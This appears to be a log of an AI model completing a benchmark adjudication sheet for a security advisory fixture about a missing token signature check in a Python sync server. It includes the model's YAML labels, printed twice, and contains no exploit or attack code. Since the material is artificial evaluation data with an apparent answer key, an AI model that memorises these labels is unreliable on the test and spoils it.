+ 173          self.send_header("Access-Control-Allow-Headers", "Content-Type, Authorization")
+ 174          self.send_header("Access-Control-Max-Age", "86400")
+ 175          self.end_headers()
+ 176  
+ 177      # --- POST /sync/pull ---
+ 178      def do_POST(self) -> None:
+ 179          parsed = self._parse_path(self.path)
+```
+
+========================================================================
+# ADJUDICATION SHEET — label every item
+```yaml
+fixture: GHSA-xcw4-53cc-hv32
+revisions:
+- vuln
+- fixed
+instructions: Label each item REQUIRED / NOT_REQUIRED / INDETERMINATE against the
+  frozen definitions and the code context. You may add a missing required item in
+  the frozen requirement schema (kind + per-revision anchors).
+items:
+- id: item-01
+  kind: behavior
+  behavior:
+    vuln:
+      state: absent
+      context:
+        file: mnemosyne/core/sync_server.py
+        start_line: 121
+        end_line: 121
+        expression: exp = payload.get("exp", 0)
+    fixed:
+      state: present
+      anchor:
+        file: mnemosyne/core/sync_server.py
+        start_line: 121
+        end_line: 121
+        expression: 'if not valid_signature:'
+- id: item-02
+  kind: entry
+  entry:
+    vuln:
+      state: present
+      anchor:
+        file: mnemosyne/core/sync_server.py
+        start_line: 79
+        end_line: 79
+        expression: return None
+    fixed:
+      state: present
+      anchor:
+        file: mnemosyne/core/sync_server.py
+        start_line: 79
+        end_line: 79
+        expression: return None
+- id: item-03
+  kind: entry
+  entry:
+    vuln:
+      state: present
+      anchor:
+        file: mnemosyne/core/sync_server.py
+        start_line: 100
+        end_line: 100
+        expression: auth = self.headers.get("Authorization", "")
+    fixed:
+      state: present
+      anchor:
+        file: mnemosyne/core/sync_server.py
+        start_line: 154
+        end_line: 154
+        expression: auth = self.headers.get("Authorization", "")
+- id: item-04
+  kind: behavior
+  behavior:
+    vuln:
+      state: absent
+      context:
+        file: mnemosyne/core/sync_server.py
+        start_line: 121
+        end_line: 121
+        expression: exp = payload.get("exp", 0)
+    fixed:
+      state: present
+      anchor:
+        file: mnemosyne/core/sync_server.py
+        start_line: 79
+        end_line: 79
+        expression: return None
+- id: item-05
+  kind: entry
+  entry:
+    vuln:
+      state: absent
+      context:
+        file: mnemosyne/core/sync_server.py
+        start_line: 100
+        end_line: 100
+        expression: auth = self.headers.get("Authorization", "")
+    fixed:
+      state: present
+      anchor:
+        file: mnemosyne/core/sync_server.py
+        start_line: 154
+        end_line: 154
+        expression: auth = self.headers.get("Authorization", "")
+- id: item-06
+  kind: behavior
+  behavior:
+    vuln:
+      state: absent
+      context:
+        file: mnemosyne/core/sync_server.py
+        start_line: 121
+        end_line: 121
+        expression: exp = payload.get("exp", 0)
+    fixed:
+      state: absent
+      context:
+        file: mnemosyne/core/sync_server.py
+        start_line: 121
+        end_line: 121
+        expression: 'if not valid_signature:'
+- id: item-07
+  kind: behavior
+  behavior:
+    vuln:
+      state: present
+      anchor:
+        file: mnemosyne/core/sync_server.py
+        start_line: 121
+        end_line: 121
+        expression: exp = payload.get("exp", 0)
+    fixed:
+      state: present
+      anchor:
+        file: mnemosyne/core/sync_server.py
+        start_line: 121
+        end_line: 121
+        expression: 'if not valid_signature:'
+- id: item-08
+  kind: entry
+  entry:
+    vuln:
+      state: present
+      anchor:
+        file: mnemosyne/core/sync_server.py
+        start_line: 100
+        end_line: 100
+        expression: auth = self.headers.get("Authorization", "")
+    fixed:
+      state: absent
+      context:
+        file: mnemosyne/core/sync_server.py
+        start_line: 154
+        end_line: 154
+        expression: auth = self.headers.get("Authorization", "")
+```
+
+========================================================================
+# YOUR OUTPUT — reply with ONLY this YAML, nothing else
+
+```yaml
+labels:
+  item-01: REQUIRED
+  item-02: NOT_REQUIRED
+  # ... one line for EVERY item id present in the sheet ...
+missing: []
+```
+
+If you identify a missing requirement, replace [] with items in the frozen schema. Give a label for every sheet item; expression must be the exact source line(s); no prose outside the YAML.
+
+codex
+labels:
+  item-01: REQUIRED
+  item-02: NOT_REQUIRED
+  item-03: REQUIRED
+  item-04: NOT_REQUIRED
+  item-05: NOT_REQUIRED
+  item-06: NOT_REQUIRED
+  item-07: NOT_REQUIRED
+  item-08: NOT_REQUIRED
+missing: []
+tokens used
+13,205
+labels:
+  item-01: REQUIRED
+  item-02: NOT_REQUIRED
+  item-03: REQUIRED
+  item-04: NOT_REQUIRED
+  item-05: NOT_REQUIRED
+  item-06: NOT_REQUIRED
+  item-07: NOT_REQUIRED
+  item-08: NOT_REQUIRED
+missing: []
